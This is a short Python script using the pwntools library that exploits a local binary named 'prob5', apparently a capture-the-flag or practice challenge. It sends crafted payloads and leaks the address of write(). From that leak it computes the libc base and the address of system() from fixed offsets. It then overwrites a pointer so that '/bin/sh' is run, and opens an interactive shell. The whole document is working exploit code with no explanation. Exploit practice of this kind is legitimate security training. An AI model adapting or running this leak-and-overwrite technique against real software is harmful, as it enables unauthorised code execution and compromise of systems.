import pwn
import time

payload1 = b"\x02\x41\x01\x08" + b'\x5d' * 9
input1 = b"\xc8\x3f\x40\x00\x00\x00\x00\x00"

p = pwn.process("./prob5")

print(p.recv())
p.send(payload1) # 1st send

time.sleep(2)
p.send(input1)

write_addr_print = p.recv()
write_addr = 0
write_offset = 0xeef20

for i in range(0, 8) :
    write_addr += write_addr_print[i] << (8 * i)

print("write addr = " + hex(write_addr))

libc_base = write_addr - write_offset
print("libc_base = " + hex(libc_base))

system_offset = 0x48e50
system_addr = libc_base + system_offset
system_addr_print = ''

print("system addr = " + hex(system_addr))
system_addr_print = pwn.p64(system_addr)

payload2 = b"/bin/sh\x00\xc9" + pwn.p64(libc_base + 0x1c1e70) + b'\x02\x08'
p.send(payload2) # 2st send
time.sleep(1)
p.send(system_addr_print)


p.interactive()